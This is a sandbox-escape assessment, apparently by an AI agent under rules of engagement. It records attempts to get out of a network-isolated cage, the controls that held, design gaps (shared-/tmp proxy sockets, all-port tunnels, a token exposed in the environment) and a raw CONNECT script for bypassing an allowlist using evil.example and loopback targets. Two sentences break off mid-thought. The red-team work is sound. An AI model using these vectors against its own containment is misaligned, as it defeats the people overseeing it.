## Headline (what I attempted, what I believe)

The A9 target is the CONNECT parser / allowlist of husk's egress proxy — reachable, per the
brief, via `localhost:3128` (an in-cage relay) which bridges to a unix socket that crosses the
netns to the trusted proxy outside.

**From this interactive agent cage I could not reach the proxy at all**, so I could not exercise
the CONNECT parser, wildcard matching, port-less-tunnel breadth, or scheduler-port refusal

`socket(AF_UNIX, …)`**. I also found **no second route out of the netns**.

So this report is mostly an **enumerated negative result** (the brief says that is a real
result), a set of **confirmed defensive controls**, and **three design observations** I can
state but could NOT demonstrate live from here — plus a **ready-to-run parser test table** for
whoever can run it in a context where the proxy IS reachable (a wired job step; A4 territory).

**I reached nothing outside the netns. I make no claim to have escaped.** The verdict belongs to
the proxy's own log (`net-proxy.log`) and the far end — neither of which is visible from in here.

## 3. Defensive controls confirmed (good news — report as such)

- **D1. netns containment holds.** Only `lo`; no route; `unshare -n` denied; no CAP_NET_ADMIN.
  A caged rank cannot fabricate an external interface.
- **D2. AF_UNIX is seccomp-blocked.** This is the load-bearing control for the brief's §6: the
  proxy's netns-crossing unix socket is a *file* visible in `/tmp`, but the cage cannot `socket()`
  it. The "file crosses the netns" design is thereby not a bypass of the gate from in-cage.
- **D3. Raw/packet sockets blocked.** No L2/L3 spoofing, no crafted-packet egress.
- **D4. seccomp is unsheddable** via user-namespace creation (`NoNewPrivs`); confirmed AF_UNIX
  still EPERM inside `unshare -Ur`.
- **D5. Trusted plane is out-of-cage and invisible.** The proxy binary, the allowlist file, and
  the audit logs (`net-proxy.log`, and `HUSK_SESSION_LOG`) are not present in the cage's mount
  view. The gate and its evidence cannot be read or tampered with from inside.
- **D6. Config the agent might use to influence egress is neutralised.** `~/.bashrc`, `.profile`,
  `.mcp.json`, `.gitconfig`, and all `.claude/*` settings are bind-mounted from `/dev/null`
  (char dev 1,3) inside the cage — the agent cannot plant proxy/egress settings there.

These are the reasons the enumerated attacks in §2 failed. They are the substance of the null
result.

## 4. Design observations (STATED, not demonstrated live from this cage)

These are boundary/design concerns I can articulate from what is visible. **None was exploited.**
Each needs confirmation in a context where the proxy is reachable, or from the trusted source.

### O1 — Shared `/tmp` exposes sibling sessions' proxy sockets; same-uid isolation rests only on owner-write
`/tmp` is **not** a private tmpfs in the cage; it is the host `/tmp`. It contains **35** `/tmp/srt-mux-<sessionid>-0.sock` proxy sockets from many husk sessions,
world-listable, with **predictable pid-based names**, mode `srwxr-xr-x` (0755). Ownership: **19
`cmueller`** (my uid — my own other sessions) and **16 `nobody`** (other users and/or my
nobody-mapped sessions; other real users collapse to `nobody` under the userns uid-map). So the
egress-socket isolation between *different real users* also rests **solely on file permissions**
(0755 ⇒ only the owner can connect), with no per-session tmpfs/namespace separation — currently
adequate cross-user (I am "other" on the 16 `nobody` sockets ⇒ no write ⇒ cannot connect), but
the same mechanism does **not** separate same-uid sessions:

- Connecting to an AF_UNIX stream socket needs **write** permission on the file. With mode
  `0755`, only the **owner** can connect. So `nobody`-owned sockets are not connectable by me
  (I'm "other"), but **every `cmueller`-owned sibling socket is owner-connectable by me** — I am
  the same uid, just a different husk session.
- husk's allowlist is **per-project** (read from `project_dir`). Two concurrent same-user
  sessions on different projects therefore have **different allowlists but the same uid**, and
  their live proxy sockets sit side-by-side in world-listable `/tmp` under predictable names.
- **The concern:** the only thing separating session B from session A's egress socket is Unix
  owner-write — which does **not** separate same-uid sessions. A caged agent that *could* open
  AF_UNIX would be able to connect to another of its user's concurrent sessions' proxy sockets
  and egress under **that** session's (possibly broader) allowlist — bypassing per-project
  scoping.
- **Why it did not fire here:** AF_UNIX is seccomp-blocked in *this* cage (D2), and per RoE I did
  **not** connect to, or probe the liveness of, any socket that is not my own (63997). Most
  siblings are also stale (dates Jul 28–Aug 1) and would refuse.
- **To confirm / refute (hand-off):** (a) does the **job-step** cage — or any husk execution
  context — permit AF_UNIX? If yes, test same-uid cross-session connect there. (b) Are per-session
  sockets namespaced to a per-session private `/tmp` in any context? Here they are not. A cheap
  fix is a per-session private tmpfs and/or a `0700` session dir, so the socket is not even
  visible to sibling sessions.

### O2 — Port-less allowlist entry = all-ports tunnel (brief ★) — could not enumerate live
The brief's headline item (a port-less entry authorises a generic TCP tunnel to that host on
**every** port; measured elsewhere via an SSH banner on 47322). **I could not add to the
measurement:** no proxy was reachable, and the allowlist file is not visible in-cage, so I could

### O3 — Per-session proxy credential is in the cage environment
The proxy basic-auth (`srt:<32-hex-token>`) is present in `http_proxy`/`https_proxy`/`all_proxy`/
`DOCKER_*`/`GIT_SSH_COMMAND` in the cage env, readable by any in-cage process. Inert **here**
(the proxy is unreachable), but if the proxy is reachable in another context and that token is a
meaningful part of its auth, env-exposure matters — especially combined with O1's co-visible
sockets. Per RoE I did not use the token; I record only that it is present in env. (May be an
accepted design if the token is per-session and the socket permission is the real gate.)

## 5. Ready-to-run CONNECT-parser test table (NOT executed — no reachable proxy here)

Run this where a husk egress proxy IS reachable (a wired job step, or against husk's real
`--net-proxy` as the C2 shard did). It speaks **raw bytes** to the proxy so curl's own
normalisation cannot hide a parser differential. For each vector it prints the proxy's status
line; pair that with the proxy's `net-proxy.log` (what it authorised) and the far end (what it
dialled) to fill the "gate saw / dial did" columns. **Assumes an allowlist containing something
like `github.com` (port-less) and `*.githubusercontent.com` for the wildcard rows — adjust to
the real allowlist.**

```python
#!/usr/bin/env python3
# usage: PROXY_HOST=127.0.0.1 PROXY_PORT=3128 PROXY_AUTH='srt:TOKEN' python3 connparse.py
import os, socket, base64
H=os.environ.get("PROXY_HOST","127.0.0.1"); P=int(os.environ.get("PROXY_PORT","3128"))
auth=os.environ.get("PROXY_AUTH","")
hdr = ("Proxy-Authorization: Basic "+base64.b64encode(auth.encode()).decode()+"\r\n") if auth else ""
def probe(label, connect_target_bytes):
    try:
        s=socket.create_connection((H,P),timeout=6)
    except Exception as e:
        print(f"[{label}] proxy-connect-ERR {e}"); return
    req=b"CONNECT "+connect_target_bytes+b" HTTP/1.1\r\n"+hdr.encode()+b"\r\n"
    try:
        s.sendall(req); r=s.recv(256)
    except Exception as e:
        print(f"[{label}] send/recv-ERR {e}"); s.close(); return
    status=r.split(b"\r\n")[0]
    print(f"[{label}] sent={connect_target_bytes!r} resp={status!r}")
    s.close()
V=[
 # brief §1 — parser differentials
 ("baseline-allowed",      b"github.com:443"),
 ("trailing-dot",          b"github.com.:443"),
 ("uppercase",             b"GITHUB.COM:443"),
 ("userinfo-at",           b"github.com@evil.example:443"),
 ("userinfo-at-rev",       b"evil.example@github.com:443"),
 ("ipv6-loopback",         b"[::1]:443"),
 ("ipv6-mapped-loopback",  b"[::ffff:127.0.0.1]:443"),
 ("port-leading-zero",     b"github.com:0443"),
 ("double-port",           b"github.com:443:443"),
 ("trailing-colon-junk",   b"github.com:..."),          # netallow.rs's own flagged trap
 ("space-before-port",     b"github.com :443"),
 ("embedded-tab",          b"github.com\t:443"),
 ("embedded-cr",           b"github.com\r.evil.example:443"),
 ("nonnumeric-port",       b"github.com:https"),
 ("absurd-length-host",    b"a"*300 + b".github.com:443"),
 ("punycode-idn",          b"xn--80ak6aa92e.com:443"),   # vs its unicode form
 # brief §2 — wildcard semantics (assumes entry *.githubusercontent.com)
 ("wild-apex",             b"githubusercontent.com:443"),
 ("wild-multilabel",       b"a.b.githubusercontent.com:443"),
 ("wild-prefix-glue",      b"evil-githubusercontent.com:443"),
 ("wild-suffix-append",    b"githubusercontent.com.evil.example:443"),
 # brief §3 — name vs address: IP literals for a disallowed endpoint
 ("ip-literal-private",    b"10.0.0.1:22"),
 ("ip-literal-loopback",   b"127.0.0.1:6817"),
 # brief §7 — port-less entry breadth: entry github.com has NO port; try non-443 ports
 ("portless-ssh",          b"github.com:22"),
 ("portless-pg",           b"github.com:5432"),
 ("portless-slurmctld",    b"github.com:6817"),
 ("portless-arbitrary",    b"github.com:47322"),
 # brief §5 — scheduler ports, refused even under *; try by name and alt spelling
 ("slurmctld-by-name",     b"slurmctld.balfrin:6817"),
 ("slurmd-port",           b"localhost:6818"),
]
for label,t in V: probe(label,t)
```

Interpretation key: a `200` status = gate authorised (then compare the dialled
endpoint in the proxy log); `403/407/400` = refused. The rows that matter most are any where the
**status disagrees with what the host name should mean** — e.g. `trailing-dot`, `embedded-cr`,
`double-port`, `userinfo-at`, `ipv6-mapped-loopback` reaching a refused endpoint, or any
`portless-*` returning 200 for a non-443 port.
